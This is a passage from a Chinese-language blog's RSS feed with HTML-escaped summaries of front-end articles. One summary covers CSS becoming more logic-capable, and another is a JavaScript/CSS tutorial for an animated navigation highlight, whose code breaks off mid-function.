&lt;/h2&gt;&lt;p&gt;本文展示了使用Kubeflow和开源工具构建从原始数据到实时模型服务的完整、可复现AI/ML工作流。通过这一蓝图，您可以调整和扩展流程以适应自己的机器学习项目。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CSS智能化：探索更智能样式语言的未来</title>
        <link>http://localhost:1313/p/css%E6%99%BA%E8%83%BD%E5%8C%96%E6%8E%A2%E7%B4%A2%E6%9B%B4%E6%99%BA%E8%83%BD%E6%A0%B7%E5%BC%8F%E8%AF%AD%E8%A8%80%E7%9A%84%E6%9C%AA%E6%9D%A5/</link>
        <pubDate>Mon, 04 Aug 2025 06:42:03 +0800</pubDate>
        
        <guid>http://localhost:1313/p/css%E6%99%BA%E8%83%BD%E5%8C%96%E6%8E%A2%E7%B4%A2%E6%9B%B4%E6%99%BA%E8%83%BD%E6%A0%B7%E5%BC%8F%E8%AF%AD%E8%A8%80%E7%9A%84%E6%9C%AA%E6%9D%A5/</guid>
        <description>&lt;h1 id=&#34;css智能化探索更智能样式语言的未来&#34;&gt;CSS智能化：探索更智能样式语言的未来
&lt;/h1&gt;&lt;p&gt;CSS已从纯粹的呈现性语言发展为具备逻辑能力——这要归功于容器查询、关系型伪类和if()函数等特性。它是否仍仅用于样式设计，还是正在演变成更强大的工具？Gabriel Shoyombo探讨了CSS近年来的智能化进程、未来方向、解决的问题、复杂性争议以及开发者对此转变的反应。&lt;/p&gt;
&lt;h2 id=&#34;历史背景css的刻意简化&#34;&gt;历史背景：CSS的刻意简化
&lt;/h2&gt;&lt;p&gt;CSS的诞生初衷是实现内容与表现的分离。1996年发布的CSS1仅支持基础样式：字体、颜色、盒模型等。2011年定稿的CSS2.1成为现代CSS标准，但开发者仍需通过浮动、定位等&amp;quot;黑魔法&amp;quot;实现复杂布局。&lt;/p&gt;
&lt;h2 id=&#34;css3迈向环境感知的第一步&#34;&gt;CSS3：迈向环境感知的第一步
&lt;/h2&gt;&lt;p&gt;CSS3采用模块化发布模式，带来了Flexbox、Grid布局和媒体查询等革命性特性。特别是用户偏好媒体特性（如prefers-color-scheme）使CSS首次具备环境感知能力，能根据设备特性和用户设置调整样式。&lt;/p&gt;
&lt;h2 id=&#34;驱动智能化的新特性&#34;&gt;驱动智能化的新特性
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;容器样式查询&lt;/strong&gt;允许基于父容器变量调整样式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;container&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;--theme&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;dark&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nc&#34;&gt;button&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;black&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;if()函数&lt;/strong&gt;将实现内联条件逻辑（目前仅Chrome 137+支持）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;padding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;--theme&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;dark&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;2rem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;3rem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;新css模糊了与javascript的边界&#34;&gt;新CSS：模糊了与JavaScript的边界？
&lt;/h2&gt;&lt;p&gt;传统分工中，CSS负责表现，JavaScript处理行为。但现代CSS已能实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过&lt;code&gt;:hover&lt;/code&gt;和过渡实现交互动画&lt;/li&gt;
&lt;li&gt;利用&lt;code&gt;&amp;lt;details&amp;gt;&lt;/code&gt;标签创建手风琴组件&lt;/li&gt;
&lt;li&gt;使用滚动吸附实现轮播图&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;:target&lt;/code&gt;伪类控制模态框&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;争议css中的逻辑是否有利&#34;&gt;争议：CSS中的逻辑是否有利？
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;支持方&lt;/strong&gt;认为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;减少JavaScript依赖提升性能&lt;/li&gt;
&lt;li&gt;预处理器已证明逻辑的价值&lt;/li&gt;
&lt;li&gt;符合组件化开发趋势&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;反对方&lt;/strong&gt;担忧：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;破坏关注点分离原则&lt;/li&gt;
&lt;li&gt;增加调试复杂度&lt;/li&gt;
&lt;li&gt;抬高新手上手门槛&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;保持灵魂的智能化演进&#34;&gt;保持灵魂的智能化演进
&lt;/h2&gt;&lt;p&gt;关键挑战在于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;条件规则&lt;/strong&gt;：通过&lt;code&gt;@when...@else&lt;/code&gt;等语法引入受限逻辑&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;强大选择器&lt;/strong&gt;：扩展&lt;code&gt;:has()&lt;/code&gt;等关系型选择器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;原生作用域&lt;/strong&gt;：实验性&lt;code&gt;@scope&lt;/code&gt;规则解决样式污染&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;警示智能并非总是更好&#34;&gt;警示：智能并非总是更好
&lt;/h2&gt;&lt;p&gt;智能化带来的风险包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;学习曲线陡峭化&lt;/li&gt;
&lt;li&gt;工具链依赖加重&lt;/li&gt;
&lt;li&gt;调试难度增加&lt;/li&gt;
&lt;li&gt;可能重复CSS早期&amp;quot;黑魔法&amp;quot;的历史&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;CSS的进化本质是赋予其更多环境感知和逻辑能力，而非变成编程语言。未来的挑战在于平衡功能增强与保持其声明式本质，确保新特性真正解决实际问题而非制造新障碍。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>使用JavaScript和CSS创建&#34;动态高亮&#34;导航栏</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8javascript%E5%92%8Ccss%E5%88%9B%E5%BB%BA%E5%8A%A8%E6%80%81%E9%AB%98%E4%BA%AE%E5%AF%BC%E8%88%AA%E6%A0%8F/</link>
        <pubDate>Mon, 04 Aug 2025 06:30:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8javascript%E5%92%8Ccss%E5%88%9B%E5%BB%BA%E5%8A%A8%E6%80%81%E9%AB%98%E4%BA%AE%E5%AF%BC%E8%88%AA%E6%A0%8F/</guid>
        <description>&lt;h1 id=&#34;使用javascript和css创建动态高亮导航栏&#34;&gt;使用JavaScript和CSS创建&amp;quot;动态高亮&amp;quot;导航栏
&lt;/h1&gt;&lt;p&gt;在本教程中，Blake Lundquist将带我们学习使用纯JavaScript和CSS创建&amp;quot;动态高亮&amp;quot;导航模式的两种方法。第一种技术使用getBoundingClientRect方法在点击时显式动画导航栏项之间的边框。第二种方法使用新的View Transition API实现相同的功能。&lt;/p&gt;
&lt;h2 id=&#34;初始标记&#34;&gt;初始标记
&lt;/h2&gt;&lt;p&gt;假设我们有一个单页应用程序，内容更改时页面不会重新加载。起始HTML和CSS是标准的导航栏，带有一个id为#highlight的额外div元素。我们给第一个导航项添加.active类。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nav&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;highlight&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;active&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;#services&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Services&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;#about&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;About&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;#contact&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Contact&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nav&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;添加点击事件处理程序&#34;&gt;添加点击事件处理程序
&lt;/h2&gt;&lt;p&gt;我们希望当用户更改.active导航项时高亮元素能够动画移动。我们为nav元素添加点击事件处理程序，然后筛选仅由匹配我们选择器元素引发的事件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;navbar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nav&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;navbar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;addEventListener&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;click&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nav a:not(active)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nav a.active&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;classList&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;active&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;classList&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;active&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;移动高亮效果&#34;&gt;移动高亮效果
&lt;/h2&gt;&lt;p&gt;使用getBoundingClientRect，我们可以获取元素位置和大小信息。我们计算活动导航项的宽度及其相对于父元素左边界的偏移量，然后将样式分配给高亮元素使其大小和位置匹配。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;moveHighlight&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;activeNavItem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a.active&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;highlighterElement&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;#highlight&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;width&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;activeNavItem&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;offsetWidth&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;itemPos&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;activeNavItem&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getBoundingClientRect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;navbarPos&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;navbar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getBoundingClientRect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
